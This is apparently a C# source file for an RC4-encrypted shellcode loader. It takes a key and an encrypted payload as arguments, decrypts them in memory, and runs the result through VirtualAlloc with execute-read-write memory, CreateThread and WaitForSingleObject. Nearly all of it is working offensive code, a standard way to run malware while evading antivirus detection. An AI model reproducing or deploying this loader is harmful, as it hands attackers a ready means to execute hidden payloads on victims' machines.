using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace payload_2rc4_loader
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Payload Decryption tool by arguments.");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            string Payload_Encrypted;
            string[] Input_Keys = args[0].Split(' ');
            byte[] xKey = new byte[Input_Keys.Length];
            Console.Write("[!] Decryption KEY: ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            /// Converting String to Byte for KEY
            for (int i = 0; i < Input_Keys.Length; i++)
            {
                xKey[i] = Convert.ToByte(Input_Keys[i], 16);
                Console.Write(xKey[i].ToString("x2") + " ");
            }
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            /// Converting String to Byte
            Payload_Encrypted = args[1].ToString();
            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(' ');
            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            try
            {
                Console.WriteLine();
                Console.WriteLine("[!] Loading Encrypted Payload in Memory.");
                Console.ForegroundColor = ConsoleColor.Green;
                byte[] Final_Payload = Decrypt(xKey, _X_to_Bytes);
                Console.WriteLine("[>] Decrypting Payload by KEY in Memory.");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("FUMA: All is ok!");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)Final_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(Final_Payload, 0, (IntPtr)(funcAddr), Final_Payload.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xffffffff);
            }
            catch (Exception)
            {
                throw;
            }
        }
        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }
        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
            .Select(i => (byte)i)
            .ToArray();
            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;
                Swap(s, i, j);
            }
            return s;
        }
        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);
            int i = 0;
            int j = 0;
            return data.Select((b) =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;
                Swap(s, i, j);
                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }
        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];
            s[i] = s[j];
            s[j] = c;
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags,
        ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
